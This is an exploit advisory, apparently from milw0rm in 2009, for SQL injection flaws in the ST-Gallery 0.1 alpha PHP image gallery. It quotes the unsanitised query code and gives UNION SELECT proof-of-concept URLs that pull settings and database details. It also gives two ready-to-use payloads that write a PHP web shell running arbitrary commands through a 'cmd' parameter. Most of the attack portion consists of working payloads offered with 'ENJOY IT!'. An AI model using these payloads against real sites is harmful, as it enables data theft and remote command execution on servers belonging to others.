@@ -1,0 +1,165 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	    	 SQL INJECTION VULNERABILITIES		             	     |
+|--------------------------------------------------------------------------------------------|
+|                               | ST-Gallery version 0.1 alpha  |		 	     |
+|  CMS INFORMATION:		 -------------------------------	                     |
+|										             |
+|-->WEB: http://blog.sebastian-thiele.net/projekte/gallery/          			     |
+|-->DOWNLOAD: http://sourceforge.net/projects/st-gallery/                   		     |
+|-->DEMO: N/A										     |
+|-->CATEGORY: CMS / Image Galleries							     |
+|-->DESCRIPTION: Diese Galerie ist der erste Teil einer Projektreihe.      	             |
+|		Diese Galerie ist für Leute gedacht, die sich mit der  PHP-Programmierung... |
+|-->RELEASED: 2009-02-26								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3						                     |
+|-->DORK: N/A									             |
+|-->CATEGORY: SQL INJECTION							             |
+|-->AFFECT VERSION: CURRENT						 		     |
+|-->Discovered Bug date: 2009-04-05							     |
+|-->Reported Bug date: 2009-04-05							     |
+|-->Fixed bug date: Not fixed								     |
+|-->Info patch: Not fixed							             |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+#########################
+////////////////////////
+
+SQL INJECTION (SQLi):
+
+////////////////////////
+#########################
+
+
+<<<<---------++++++++++++++ Condition: magic_quotes_gpc=off +++++++++++++++++--------->>>>
+
+
+-------
+INTRO:
+-------
+
+
+This is a crazy app, admin zone isn't protected, perhaps it needs a .htaccess file. Database doesn't store
+
+information about users (or admin).
+
+
+------------
+FILES VULN:
+------------
+
+Path --> [HOME_PATH]/example.php
+
+...
+
+if($_GET[gallery_category]){
+
+	getGalleryImage($_GET[gallery_category], $_GET[gallery_show], true, "both", 450, "");
+
+}
+
+...
+
+Path --> [HOME_PATH0]/st_admin/gallery_output.php
+
+...
+
+function getGalleryImage($album, $image, $showAlbum, $posNav, $maxWidth){ 
+
+if($showAlbum){    
+
+	$abfrage = "SELECT * FROM ".$db_prefix."gallery_category WHERE id = '$album'";   
+	$ergebnis = mysql_query($abfrage);   
+...
+  
+}  
+$abfrage = "SELECT * FROM ".$db_prefix."gallery_images WHERE category = '$album'";  
+$ergebnis = mysql_query($abfrage); 
+
+...
+
+
+-------------------
+PROOFS OF CONCEPT:
+-------------------
+
+
+GET vars --> gallery_category and gallery_show
+
+
+PoC-1: http://[HOST]/[HOME_PATH]/example.php?gallery_category=-1%27+UNION+ALL+SELECT+1,concat(name,0x3A3A3A,value)+FROM+st_settings+WHERE+id=2/*
+
+
+Return --> gallery_path = ... (**take note)
+
+
+PoC-2: http://127.0.0.1/st-gallery/example.php?gallery_category=1&gallery_show=-1%27+union+all+select+1,version(),database(),4,5,6/*
+
+
+Return --> version and databse
+
+
+-------------------------
+EXPLOITS (SHELL UPLOAD):
+-------------------------
+
+
+<<<<---------++++++++++++++ Condition: Permission to create files +++++++++++++++++--------->>>>
+
+
+[COMPLETE-PATH] --> (**use note)
+
+
+Ex-1: http://[HOST]/[HOME_PATH]/example.php?gallery_category=-1%27+UNION+ALL+SELECT+'<HTML><title>SHELL BY --Y3NH4CK3R--></title><body text=ffffff bgcolor=000000><center><h1>YOUR SHELL IS ON!<br></h1></center><br><br><font color=ff0000><h2>Get var (cmd) to execute comands. Enjoy it!</h2></font><h3>Command Result:</h3><?php system($_GET[cmd]); ?>','<br><br><font color=ff0000><h3>By y3nh4ck3r. Contact: y3nh4ck3r@gmail.com</h3></font></body></HTML>'+INTO+OUTFILE+'[COMPLETE-PATH]/shell.php'/*
+
+
+Ex-1: http://[HOST]/[HOME_PATH]/example.php?gallery_category=1&gallery_show=-1%27+UNION+ALL+SELECT+'<HTML><title>SHELL BY --Y3NH4CK3R--></title><body text=ffffff bgcolor=000000><center><h1>YOUR SHELL IS ON!<br></h1>','</center><br><br><font color=ff0000><h2>Get var (cmd) to execute comands. Enjoy it!</h2></font>','<h3>Command Result:</h3><?php system($_GET[cmd]); ?>','<br><br><font color=ff0000>','<h3>By y3nh4ck3r. Contact: y3nh4ck3r@gmail.com</h3>','</font></body></HTML>'+INTO+OUTFILE+'[COMPLETE-PATH]/shell.php'/*
+
+
+Return: Your shell in --> http://[HOST]/[HOME_PATH]/shell.php
+
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+#######################################################################
+#######################################################################
+##*******************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+##     GREETZ TO: JosS, Ulises2k and all spanish Hack3Rs community!  ##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+
+# milw0rm.com [2009-05-07]
